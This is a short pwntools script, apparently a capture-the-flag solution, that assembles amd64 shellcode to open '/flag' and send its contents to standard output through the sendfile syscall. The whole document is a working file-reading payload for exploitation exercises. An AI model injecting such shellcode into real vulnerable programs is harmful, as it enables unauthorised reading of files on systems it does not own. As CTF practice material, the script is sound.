from pwn import *

context.arch = "amd64"

"""
H(0x48) prefix for back compatible with i386, but there are exception instructions: `push` and `pop`
"""
sc_bytes = asm("""
lea edi, [rip + flag]
push 2                          # SYS_open
pop rax
push 0                          # O_RDONLY
pop rsi
syscall

push 0x100
pop r10
push rax
pop rsi
push 0x28                       # SYS_sendfile
pop rax
push 1
pop rdi
cdq                             # rdx = 0
syscall
flag:
    .asciz "/flag"
""")
